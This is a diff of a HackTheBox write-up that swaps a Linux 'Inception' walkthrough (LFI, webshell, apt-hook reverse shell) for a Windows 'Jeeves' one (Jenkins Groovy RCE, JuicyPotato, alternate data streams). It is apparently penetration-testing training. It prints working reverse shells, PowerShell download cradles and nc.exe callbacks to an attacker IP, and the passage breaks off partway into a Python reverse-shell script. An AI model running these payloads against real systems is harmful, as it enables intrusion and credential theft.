@@ -1,20 +1,22 @@
 ## Default Information
-IP Address: 10.10.10.67\
-OS: Linux
+IP Address: 10.10.10.63\
+OS: Windows
 
 ## Discovery
 
 Before we start, let's first add the IP address and the host to our ```/etc/hosts``` file.
 
 ```
-10.10.10.67  inception.htb
+10.10.10.63  jeeves.htb
 ```
 ### Masscan
 Firstly, we will use rustscan to identify the open ports
 
 ```
-Open 10.10.10.67:80
-Open 10.10.10.67:3128
+Open 10.10.10.63:80
+Open 10.10.10.63:135
+Open 10.10.10.63:445
+Open 10.10.10.63:50000
 ```
 
 ### Nmap
@@ -22,552 +24,458 @@ We will then use the open ports obtained from rustscan to run a scan using nmap 
 
 | Port Number | Service | Version | State |
 |-----|------------------|----------------------|----------------------|
-| 80 | http | Apache httpd 2.4.18 ((Ubuntu)) | Open |
-| 3128 | http-proxy | Squid http proxy 3.5.12 | Open |
+| 80 | http | Microsoft IIS httpd 10.0 | Open |
+| 135 | msrpc | Microsoft Windows RPC | Open |
+| 445 | microsoft-ds | Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) | Open |
+| 50000 | http | Jetty 9.4.z-SNAPSHOT | Open |
 
-### Web Enumeration
-First, we will use gobuster to enumerate the endpoints on http://inception.htb:80. From the output, we notice an interesting endpoint which is http://inception.htb:80/dompdf.
+
+Looking at our nmap output, we can see that port 445 is open. This means that this machine supports smb services. Apart from that, we notice that port 50000 supports web services and there is a Jetty 9.4.z-SNAPSHOT as its version. We will look into port 50000 in detail later on.
+
+### SMB Enumeration
+Let us first try to do a null authentication on port 445 using smbmap. Unfortunately, we are unable to do null authentication on port 445 using smbmap
 
 ```
-http://10.10.10.67:80/LICENSE.txt          (Status: 200) [Size: 17128]
-http://10.10.10.67:80/README.txt           (Status: 200) [Size: 2307]
-http://10.10.10.67:80/index.html           (Status: 200) [Size: 2877]
-http://10.10.10.67:80/assets               (Status: 301) [Size: 311] [--> http://10.10.10.67/assets/]
-http://10.10.10.67:80/images               (Status: 301) [Size: 311] [--> http://10.10.10.67/images/]
-http://10.10.10.67:80/dompdf               (Status: 301) [Size: 311] [--> http://10.10.10.67/dompdf/]
+┌──(kali㉿kali)-[~/Desktop/jeeves]
+└─$ smbmap -u '' -p '' -H 10.10.10.63 -P 445 2>&1
+[!] Authentication error on 10.10.10.63
+                                                                                                       
+┌──(kali㉿kali)-[~/Desktop/jeeves]
+└─$ smbmap -u null -p '' -H 10.10.10.63 -P 445 2>&1
+[!] Authentication error on 10.10.10.63
+                                                                                                       
+┌──(kali㉿kali)-[~/Desktop/jeeves]
+└─$ smbmap -u '' -p null -H 10.10.10.63 -P 445 2>&1
+[!] Authentication error on 10.10.10.63
+                                                                                                       
+┌──(kali㉿kali)-[~/Desktop/jeeves]
+└─$ smbmap -u null -p null -H 10.10.10.63 -P 445 2>&1
+[!] Authentication error on 10.10.10.63
 ```
 
-Inspecting the source code of http://inception.htb, we also notice that there is a comment regarding dompdf
+### Web Enumeration on port 80
+Navigating to http://jeeves.htb:80, we manage to find an ```Ask Jeeves``` site that looks like a search engine. However, we realize that whenever we query anything, we will get redirected to an http://jeeves.htb:80/error.html which is an error page. 
+
+From the error page, we can know that the backend database uses Microsoft SQL Server 2005. However, looking at the page source, we realize that this is not an error page but an image instead.
+
+![Error Page](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/error.png)
+
+Nevertheless, let us try to use SQL Injection payloads on http://jeeves.htb:80. Unfortunately, we are unable to find any SQL Injection from this site. 
+
+Next, let us look at the gobuster output to find for any potential endpoints that could be exploited. Unfortunately, we are unable to find any interesting endpoints
+
+```
+http://10.10.10.63:80/error.html           (Status: 200) [Size: 50]
+http://10.10.10.63:80/index.html           (Status: 200) [Size: 503]
+```
+
+### Web Enumeration on port 50000
+Navigating to http://jeeves.htb:50000, we are given 404 response code as the site could not be found. However, from the error page, we know that the site is powered by Jetty://9.4.z-SNAPSHOT
+
+![Jetty error](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/jetty.png)
+
+Looking up searchsploit for potential exploits, we are able to find a possible directory traversal vulnerability. 
 
 ```
 ┌──(kali㉿kali)-[~]
-└─$ curl http://inception.htb  
-...
-<!-- Todo: test dompdf on php 7.x -->
+└─$ searchsploit jetty    
+--------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                       |  Path
+--------------------------------------------------------------------- ---------------------------------
+Jetty 3.1.6/3.1.7/4.1 Servlet Engine - Arbitrary Command Execution   | cgi/webapps/21895.txt
+Jetty 4.1 Servlet Engine - Cross-Site Scripting                      | jsp/webapps/21875.txt
+Jetty 6.1.x - JSP Snoop Page Multiple Cross-Site Scripting Vulnerabi | jsp/webapps/33564.txt
+jetty 6.x < 7.x - Cross-Site Scripting / Information Disclosure / In | jsp/webapps/9887.txt
+Jetty Web Server - Directory Traversal                               | windows/remote/36318.txt
+Mortbay Jetty 7.0.0-pre5 Dispatcher Servlet - Denial of Service      | multiple/dos/8646.php
+--------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
 ```
 
-Navigating to http://inception.htb/dompdf, we are able to view a directory listing of the files. From there, we are able to find a file named "version". Navigating to http://inception.htb/dompdf/version, we are able to find out that the version of dompdf that is being used would be 0.6.0
-![Version of dompdf used](./Images/dompdf_version.png)
+Unfortunately, we are unable to exploit the directory traversal as the site returns a 404 status code for the vulnerable endpoint
+![Directory traversal](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/directory_traversal.png)
+
+Looking at the output from our Gobuster enumeration, we are able to find an ```askjeeves``` endpoint. 
+
+```
+http://10.10.10.63:50000/askjeeves            (Status: 302) [Size: 0] [--> http://10.10.10.63:50000/askjeeves/]
+```
+
+Navigating to http://jeeves.htb:50000/askjeeves, this redirects us to a Jenkins dashboard.
+
+![askjeeves](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/askjeeves.png)
 
 ## Exploit
-### LFI on dompdf
-Looking up exploitdb, we can see from [here](https://www.exploit-db.com/exploits/33004) that there is an LFI exploit for dompdf 0.6.0.
+### RCE on Jenkins
+Navigating to http://jeeves.htb:50000/askjeeves/manage, we can find a ```Script Console``` option that allows us to write Groovy script to execute code on the Jenkins server.
 
-Let us try to read the /etc/passwd file using the LFI vulnerability that we have found. To do so, we will send a GET request to http://inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/etc/passwd. From the response, we are able to find a base64-encoded text which decodes to be the contents of the /etc/passwd file. 
+![Script Console](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/scriptconsole.png)
 
-![Demonstrating LFI](./Images/lfi.png)
-
-Since we can do an LFI exploit, we will attempt to escalate the LFI exploit to become an rce using /proc/self/environ or /proc/*/fd. Unfortunately, both of them returns a status code 500 and we are unable to exploit it. 
-
-![Attempting to exploit LFI using /proc/self/environ](./Images/lfi_proc_self_environ.png)
-![Attempting to exploit LFI using /proc/1/fd](./Images/lfi_proc_1_fd.png)
-
-Next, we will use a python script to save the list of linux files from [here](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Intruders/Linux-files.txt) to our local directory. We will then inspect the files in detail to check for any potential exploitation.
-
-Looking at the /etc/passwd file that we have extracted using the LFI vulnerability on the website, we can know that there is a user ```cobb``` on the server.
+Let us try to first execute a ```whoami``` command on http://jeeves.htb:50000/askjeeves/script using the Groovy script below:
 
 ```
-/etc/passwd
-root:x:0:0:root:/root:/bin/bash
-daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
-man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
-lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
-mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
-news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
-uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
-proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
-irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
-gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
-nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
-systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
-systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
-systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
-systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
-syslog:x:104:108::/home/syslog:/bin/false
-_apt:x:105:65534::/nonexistent:/bin/false
-sshd:x:106:65534::/var/run/sshd:/usr/sbin/nologin
-cobb:x:1000:1000::/home/cobb:/bin/bash
+def cmd = "cmd.exe /c dir".execute();
+println("${cmd.text}");
 ```
 
-Looking at the /etc/apache2/sites-enabled/000-default.conf file that we have extracted from the website using the LFI vulnerability, we are able to obtain another endpoint ```/webdav_test_inception```. From the configuration file, we are also able to obtain the location of the authentication file to be at /var/www/html/webdav_test_inception/webdav.passwd
+From the output,  we can see that it returns the output of the ```whoami``` command.
+![whoami command](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/whoami.png)
+
+Next, we will use the Groovy script console to upload nc.exe onto the temp directory, ```%userprofile\\AppData\\Local\\Temp``` and use the nc.exe to execute a reverse shell connection to our listening port. However, it seems that we are unable to obtain a reverse shell connection using this method.
 
 ```
-Alias /webdav_test_inception /var/www/html/webdav_test_inception
-<Location /webdav_test_inception>
-	Options FollowSymLinks
-	DAV On
-	AuthType Basic
-	AuthName "webdav test credential"
-	AuthUserFile /var/www/html/webdav_test_inception/webdav.passwd
-	Require valid-user
-</Location>
+def cmd = "powershell.exe -command iwr -Uri http://10.10.16.6:3000/nc.exe -Outfile %userprofile%\\AppData\\Local\\Temp".execute();
+def cmd1 = "%userprofile%\\AppData\\Local\\Temp\\nc.exe -e cmd.exe 10.10.16.6 4000"
+println("${cmd.text}");
 ```
 
-### Exploiting webdav
-Navigating to http://inception.htb/dompdf/dompdf.php?input_file=php://filter/read=convert.base64-encode/resource=/var/www/html/webdav_test_inception/webdav.passwd, we are able to obtain the base64-encoded value of a password hash
-
-![Obtaining password hash](./Images/password_hash.png)
-
-Using hashid, we recognize the hash type as MD5(APR). From the output, we can obtain the decoded value as ```babygurl69```
+Let us try to use Groovy script to create a reverse shell connection instead. This time we are able to obtain a reverse shell connection to our listening port
 
 ```
-┌──(kali㉿kali)-[~]
-└─$ hashid '$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0'              
-Analyzing '$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0'
-[+] MD5(APR) 
-[+] Apache MD5 
+String host="10.10.16.6";
+int port=4000;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-Next, we will use hashcat to crack the hash
-
-```
-┌──(kali㉿kali)-[~/Desktop/inception]
-└─$ hashcat -m 1600 hash.txt /home/kali/Desktop/pentest/wordlist/rockyou.txt
-...
-$apr1$8rO7Smi4$yqn7H.GvJFtsTou1a7VME0:babygurl69
-...
-```
-
-### Exploiting webdav
-Next, we will use davtest to test the webdav service found on http://inception.htb/webdav_test_inception.  From the output, we can see that we can upload a php web shell and execute commands on the php webshell.
-
-```            
-┌──(kali㉿kali)-[~/Desktop/inception]
-└─$ davtest -url http://inception.htb/webdav_test_inception -auth webdav_tester:babygurl69
-********************************************************
- Checking for test file execution
-EXEC    html    SUCCEED:        http://inception.htb/webdav_test_inception/DavTestDir_kkxD_jN7Zg/davtest_kkxD_jN7Zg.html
-EXEC    shtml   FAIL
-EXEC    jsp     FAIL
-EXEC    php     SUCCEED:        http://inception.htb/webdav_test_inception/DavTestDir_kkxD_jN7Zg/davtest_kkxD_jN7Zg.php
-EXEC    jhtml   FAIL
-EXEC    asp     FAIL
-EXEC    cfm     FAIL
-EXEC    aspx    FAIL
-EXEC    cgi     FAIL
-EXEC    txt     SUCCEED:        http://inception.htb/webdav_test_inception/DavTestDir_kkxD_jN7Zg/davtest_kkxD_jN7Zg.txt
-EXEC    pl      FAIL
-
-********************************************************
-```
-
-Next, we will use the ```curl``` command to upload a php webshell onto the website.
-
-```
-┌──(kali㉿kali)-[~/Desktop/inception]
-└─$ curl -X PUT http://webdav_tester:babygurl69@inception.htb/webdav_test_inception/shell.php -d @shell.php
-<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
-<html><head>
-<title>201 Created</title>
-</head><body>
-<h1>Created</h1>
-<p>Resource /webdav_test_inception/shell.php has been created.</p>
-<hr />
-<address>Apache/2.4.18 (Ubuntu) Server at inception.htb Port 80</address>
-</body></html>
-```
-
-### Exploiting webshell
-Afterwards, we will try to create a reverse shell connection using ```/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.6/4000 0>&1'``` as the payload. However, it seems that we are unable to create a reverse shell connection. 
-
-Let us verify with a ping commad to check if we can reach our local machine. From the output, we noticed that we are unable to reach our IP address. It is likely that there is a firewall or IP rules that prevent outbound connections.
-
-![Ping command](./Images/ping.png)
-
-Let us try to extract the user flag using ```cat /home/cobb/user.txt```. However, this does not return any flag for us. It might be due to the fact that the web user does not have the sufficient privileges to access the user flag in /home/cobb
-
-![Attemping to obtain user flag from webshell](./Images/webshell_user_flag.png)
-
-Listing out the directories in /var/www/html using ```ls /var/www/html```, we can find a ```wordpress_4.8.3``` directory. Furthur on, listing the ```wordpress_4.8.3``` directory reveals a wp-config.php file. We shall then proceed to view the contents of the wp-config.php file using ```cat /var/www/html/wordpress_4.8.3/wp-config.php```
-
-Viewing the contents of the wp-config.php file, we are able to discover a password ```VwPddNh7xMZyDQoByQL4```. 
-
-![Obtaining password from wp-config.php file](./Images/wp_password.png)
-
-### Exploiting Squid Proxy
-After obtaining the password, we realize that we are unable to find anywhere to use the password on. Let us use the ```netstat -an``` command to find any internal service that is running which we might be able to make use of. From the output, we can see that port 22 is running in the internal IP but not exposed to the external service.
-
-![Finding SSH service on the internal IP](./Images/ssh.png)
-
-However, we know that the Squid proxy is open on port 3128. This means that we can make use of the Squid proxy to access the service on the internal IP address of this machine. 
-
-To do so, we will have to first modify the /etc/proxychains4.conf file on our local machine to add the Squid proxy.
-
-```
-[ProxyList]
-# add proxy here ...
-# meanwile
-# defaults set to "tor"
-#socks4         127.0.0.1 9050
-http 10.10.10.67 3128
-```
-
-Using proxychains, we are then able to gain SSH access as cobb user
-
-```
-┌──(kali㉿kali)-[/etc]
-└─$ proxychains ssh cobb@127.0.0.1                                                                 2 ⚙
-[proxychains] config file found: /etc/proxychains4.conf
-[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
-[proxychains] DLL init: proxychains-ng 4.14
-[proxychains] Strict chain  ...  10.10.10.67:3128  ...  127.0.0.1:22  ...  OK
-cobb@127.0.0.1's password: 
-Welcome to Ubuntu 16.04.3 LTS (GNU/Linux 4.4.0-101-generic x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-Last login: Thu Nov 30 20:06:16 2017 from 127.0.0.1
-cobb@Inception:~$ 
-```
 ### Obtaining user flag
 
 ```
-cobb@Inception:~$ cat user.txt
+C:\Users\kohsuke\Desktop>type user.txt
+type user.txt
 <Redacted user flag>
 ```
+### Obtaining password hash
+Looking at C:\Users\Administrator\.jenkins\config.xml, we are able to find an encrypted password hash
 
+```
+<hudson.security.HudsonPrivateSecurityRealm_-Details>
+<passwordHash>
+#jbcrypt:$2a$10$QyIjgAFa7r3x8IMyqkeCluCB7ddvbR7wUn1GmFJNO2jQp2k8roehO
+</passwordHash>
+</hudson.security.HudsonPrivateSecurityRealm_-Details
+```
+
+Next, we will try to decrypt the password hash. First of all, we will have to transfer C:\Users\Administrator\.jenkins\secrets\master.key and C:\Users\Administrator\.jenkins\secrets\hudson.util.Secret to our local machine. Afterwards, we will use the jenkins_offline_decrypt.py script from [here](https://github.com/gquere/pwn_jenkins/blob/master/offline_decryption/jenkins_offline_decrypt.py) to decrypt the password hash.
+
+```
+┌──(HTB)─(kali㉿kali)-[~/Desktop/jeeves]
+└─$ python3 jenkins_offline_decrypt.py master.key hudson.util.Secret config.xml
+b979d8dc2568628f73c75157a2fec5ee
+```
+
+Afterwards, we will navigate to http://jeeves.htb:50000/askjeeves/asynchPeople/ to obtain the list of users
+![Obtaining list of users](https://github.com/joelczk/writeups/blob/main/HTB/Images/Jeeves/users.png)
+
+Afterwards, we will use the hash that we have obtained earlier and attempt to authenticate to the web interface of Jenkins using the list of users that we have found. Unfortunately, we are unable to authenticate to the web interface of Jenkins.
+
+Next, let us try to use crackmapexec to check if any of the users can authenticate to the smb server using the credential. Unfortunately, none of the users are able to authenticate to the smb server
+
+```
+┌──(kali㉿kali)-[~/Desktop/jeeves]
+└─$ crackmapexec smb 10.10.10.63 -u users.txt -p 'b979d8dc2568628f73c75157a2fec5ee'
+SMB         10.10.10.63     445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
+SMB         10.10.10.63     445    JEEVES           [-] Jeeves\anonymous:b979d8dc2568628f73c75157a2fec5ee STATUS_LOGON_FAILURE 
+SMB         10.10.10.63     445    JEEVES           [-] Jeeves\admin:b979d8dc2568628f73c75157a2fec5ee STATUS_LOGON_FAILURE 
+SMB         10.10.10.63     445    JEEVES           [-] Jeeves\MANAGE_DOMAINS:b979d8dc2568628f73c75157a2fec5ee STATUS_LOGON_FAILURE 
+SMB         10.10.10.63     445    JEEVES           [-] Jeeves\Administrator:b979d8dc2568628f73c75157a2fec5ee STATUS_LOGON_FAILURE 
+SMB         10.10.10.63     445    JEEVES           [-] Jeeves\kohsuke:b979d8dc2568628f73c75157a2fec5ee STATUS_LOGON_FAILURE
+```
 ### Privilege Escalation to root
-Using the ```sudo -l``` command, we realize that we can execute any commands with root privileges.
+Looking at the ```whoami \priv``` command, we realized that the SeImpersonatePrivilege is enabled. This means that we could potentially used the Juicy Potato exploit.
 
 ```
-cobb@Inception:/tmp$ sudo -l
-[sudo] password for cobb: 
-Matching Defaults entries for cobb on Inception:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+C:\temp>whoami /priv
+whoami /priv
 
-User cobb may run the following commands on Inception:
-    (ALL : ALL) ALL
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
 ```
 
-Next, we will use ```sudo su``` to escalate our privileges to become root
+Before we being, let us check the system information using the ```systeminfo``` command to check if the version of Windows that we are using could be exploited using Juciy potato. From the output of the ```systeminfo``` command, we can see that we are using Windows 10 Professional which is vulnerable to the Juicy Potato exploit. 
 
 ```
-cobb@Inception:/tmp$ sudo su
-root@Inception:/tmp# 
+C:\temp>systeminfo
+systeminfo
+
+Host Name:                 JEEVES
+OS Name:                   Microsoft Windows 10 Pro
+OS Version:                10.0.10586 N/A Build 10586
 ```
 
-However, what we realize is that we are still unable to get the root flag. The /root/root.txt file does give us a hint as shown below.
+Afterwards, we will transfer the nc.exe, and the juicy potato exploit to our C:\temp directory. Afterwards, we can use the JuicyPotato executable to create a reverse shell connection (NOTE: we may have to trial and error with the list of CLSIDs to obtain the correct CLSID to use)
 
 ```
-root@Inception:/tmp# cat /root/root.txt
-You're waiting for a train. A train that will take you far away. Wake up to find root.txt.
+jp.exe -l 1337 -c "{F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}" -p "c:\windows\system32\cmd.exe" -a "/c C:\temp\nc.exe -e cmd.exe 10.10.16.6 2000" -t *
 ```
 
-### Network Enumeration
-Given that we can easily run ```sudo``` on any commands with the cobb user and that the flag cannot be found, I suspect that we are in a container. 
-
-Using the ```df -h``` command, we can see that we are currently being mounted on a lxd container. 
-
-```
-root@Inception:/# df -h
-Filesystem      Size  Used Avail Use% Mounted on
-/dev/sda1        19G  2.9G   15G  17% /
-none            492K     0  492K   0% /dev
-udev            477M     0  477M   0% /dev/tty
-tmpfs           100K     0  100K   0% /dev/lxd
-tmpfs           100K     0  100K   0% /dev/.lxd-mounts
-tmpfs           497M   12K  497M   1% /dev/shm
-tmpfs           497M  6.4M  490M   2% /run
-tmpfs           5.0M     0  5.0M   0% /run/lock
-tmpfs           497M     0  497M   0% /sys/fs/cgroup
-```
-
-Since we know that we are in a container and that we are unable to transfer files over to the linux machine as the outgoing packets are dropped, we will do a ping sweep of the subnet to find the IP addresses in the subnet.
-
-From the output, we are able to find the IP address of the subnet as 192.168.0.1
-
-```
-root@Inception:/# for i in {1..254}; do (ping -c 1 192.168.0.${i} | grep "bytes from" | grep -v "Unreachable" &); done;
-64 bytes from 192.168.0.1: icmp_seq=1 ttl=64 time=0.031 ms
-64 bytes from 192.168.0.10: icmp_seq=1 ttl=64 time=0.023 ms
-root@Inception:/# 
-```
-
-Next, let us use ```nc``` to identify the open TCP ports on this machine. From the output, we can see that we have both port 21 and port 22 that are open on this machine. 
-
-```
-root@Inception:/# nc -zv 192.168.0.1 1-65535 2>&1 | grep -v refused
-Connection to 192.168.0.1 21 port [tcp/ftp] succeeded!
-Connection to 192.168.0.1 22 port [tcp/ssh] succeeded!
-Connection to 192.168.0.1 53 port [tcp/domain] succeeded!
-```
-
-Afterwards, let us use ```nc``` again to identify the open UDP ports on this machine. 
-
-```
-root@Inception:/# nc -uzv 192.168.0.1 1-65535 2>&1 | grep -v refused
-Connection to 192.168.0.1 53 port [udp/domain] succeeded!
-Connection to 192.168.0.1 67 port [udp/bootps] succeeded!
-Connection to 192.168.0.1 69 port [udp/tftp] succeeded!
-root@Inception:/# 
-```
-
-### Exploiting FTP on 192.168.0.1
-Let us first try to do an anonymous login on the FTP on port 21 in 192.168.0.1
-
-```
-root@Inception:/# ftp 192.168.0.1
-Connected to 192.168.0.1.
-220 (vsFTPd 3.0.3)
-Name (192.168.0.1:cobb): anonymous
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> 
-```
-
-We realized that we are unable to write files using FTP as we do not have the permissions to do so. 
-
-```
-ftp> put test.txt
-local: test.txt remote: test.txt
-200 PORT command successful. Consider using PASV.
-550 Permission denied.
-```
-
-However, we realize that we are able to download files using FTP. Using this, we can download the ```crontab`` file from the /etc directory
-
-In the /etc directory, we realize that we do not have the permissions to download the cron.d file, but we are able to download the crontab file
-
-```
-ftp> get cron.d
-local: cron.d remote: cron.d
-200 PORT command successful. Consider using PASV.
-550 Failed to open file.
-ftp> get cron.daily
-local: cron.daily remote: cron.daily
-200 PORT command successful. Consider using PASV.
-550 Failed to open file.
-ftp> get crontab
-local: crontab remote: crontab
-200 PORT command successful. Consider using PASV.
-150 Opening BINARY mode data connection for crontab (826 bytes).
-226 Transfer complete.
-826 bytes received in 0.00 secs (15.7547 MB/s)
-```
-
-Inspecting the downloaded crontab file, we realize that there is a ```apt upgrade``` that is being executed every 5 mins
-
-```
-root@Inception:/tmp# cat crontab
-# /etc/crontab: system-wide crontab
-# Unlike any other crontab you don't have to run the `crontab'
-# command to install the new version when you edit this file
-# and files in /etc/cron.d. These files also have username fields,
-# that none of the other crontabs do.
-
-SHELL=/bin/sh
-PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
-
-# m h dom mon dow user  command
-17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
-25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
-47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
-52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
-*/5 *   * * *   root    apt update 2>&1 >/var/log/apt/custom.log
-30 23   * * *   root    apt upgrade -y 2>&1 >/dev/null
-```
-
-We are also able to find a tptpd-hpa file in the /etc/default directory. We will then download the file to the machine and inspect the contents.
-
-```
-ftp> cd /etc
-250 Directory successfully changed.
-ftp> cd default
-250 Directory successfully changed.
-ftp> get tftpd-hpa
-local: tftpd-hpa remote: tftpd-hpa
-200 PORT command successful. Consider using PASV.
-150 Opening BINARY mode data connection for tftpd-hpa (118 bytes).
-226 Transfer complete.
-118 bytes received in 0.00 secs (1.3239 MB/s)
-ftp> 
-```
-
-### Exploiting TFTP
-We realize that we can authenticate to tftp without any credentials. However, we notice that tftp does not have the ability to list out files and directories.
-
-```
-root@Inception:/tmp# tftp 192.168.0.1
-tftp> ls
-?Invalid command
-```
-
-Next, we will try if tftp has the ability to write files. We notice that the write operation is successful and listing the /home directory using the FTP service, we realize that the test.txt file has been written in the /home directory.
-
-```
-tftp> put test.txt /home/test.txt
-Sent 6 bytes in 0.0 seconds
-------------------------------------------------
-root@Inception:/tmp# ftp 192.168.0.1
-Connected to 192.168.0.1.
-220 (vsFTPd 3.0.3)
-Name (192.168.0.1:cobb): anonymous
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
-ftp> cd /home
-250 Directory successfully changed.
-ftp> ls
-200 PORT command successful. Consider using PASV.
-150 Here comes the directory listing.
--rw-rw-rw-    1 0        0               5 May 27 03:35 test.txt
-226 Directory send OK.
-ftp> 
-```
-
-### Exploiting apt update
-Using the tutorial from [here](https://www.cyberciti.biz/faq/debian-ubuntu-linux-hook-a-script-command-to-apt-get-upgrade-command/), we can hook a script command during the ```apt update```. Since we know that ```apt update``` command runs every 5mins, we can use this exploit to create a reverse shell
-
-Next, we will craft a reverse shell command and save the file in the /tmp directory
-
-```
-root@Inception:/tmp# cat exploit
-APT::Update::Pre-Invoke {"bash -c 'bash -i >& /dev/tcp/10.10.16.6/4000 0>&1'"}
-```
-
-Next, we will move the exploit script to the /etc/apt/apt.conf.d/ directory using tftp
-
-```
-tftp> put /tmp/exploit /etc/apt/apt.conf.d/exploit 
-Sent 80 bytes in 0.0 seconds
-```
-
-After a while, when the ```apt update``` runs, the script will be executed and there will be a reverse shell connection to our local machine
 ### Obtaining root flag
+Navigating to C:\Users\Administrator\Desktop, we realize that there is no root.txt file. Instead, we can only find the hm.txt file. Looking into the contents of the hm.txt file, we get the hint that the flag might be elsewhere
+
 ```
-┌──(kali㉿kali)-[~]
-└─$ nc -nlvp 4000       
-listening on [any] 4000 ...
-connect to [10.10.16.6] from (UNKNOWN) [10.10.10.67] 57166
-bash: cannot set terminal process group (4595): Inappropriate ioctl for device
-bash: no job control in this shell
-root@Inception:/tmp# cat /root/root.txt
-cat /root/root.txt
+C:\Users\Administrator\Desktop>type hm.txt
+type hm.txt
+The flag is elsewhere.  Look deeper.
+```
+
+This might be a case of hidden files in the directory. To find the hidden file, we will use the ```dir /R``` command to look for potentially hidden files. From the output,  we can see that there is a root.txt file that is hidden inside the hm.txt file. 
+
+```
+C:\Users\Administrator\Desktop>dir /R
+dir /R
+ Volume in drive C has no label.
+ Volume Serial Number is BE50-B1C9
+
+ Directory of C:\Users\Administrator\Desktop
+
+11/08/2017  10:05 AM    <DIR>          .
+11/08/2017  10:05 AM    <DIR>          ..
+12/24/2017  03:51 AM                36 hm.txt
+                                    34 hm.txt:root.txt:$DATA
+11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
+               2 File(s)            833 bytes
+               2 Dir(s)   7,455,174,656 bytes free
+```
+
+Referencing the blog from [here](https://davidhamann.de/2019/02/23/hidden-in-plain-sight-alternate-data-streams/) and the hacktricks tutorial from [here](https://book.hacktricks.xyz/windows-hardening/basic-cmd-for-pentesters#alternate-data-streams-cheatsheet-ads-alternate-data-stream), we can know that this is a typical form of Alternate Data Streams and we can extract the root.txt file using the ```more``` command.
+
+```
+C:\Users\Administrator\Desktop>more < hm.txt:root.txt
+more < hm.txt:root.txt
 <Redacted root flag>
-root@Inception:/tmp# 
 ```
 ## Post-Exploitation
-### Script for LFI
+### Alternative way of reverse shell using Groovy script
+
+An alternative way that we can create a reverse shell command would be to use the Invoke-PowerShellTcp.ps1 script. We can host the Invoke-PowerShellTcp.ps1 script on our local machine and use the Groovy script to upload the ps1 script to the server and create a reverse shell connection to our listening port on our local machine. 
 
 ```
+def cmd = """ powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.16.6:3000/Invoke-PowerShellTcp.ps1') """.execute()
+println("${cmd.text}");
+```
+
+### Reverse Shell Script
+We have also wriitten a python3 reverse shell script for automating the reverse shell connection
+
+```python
 import requests
-import base64
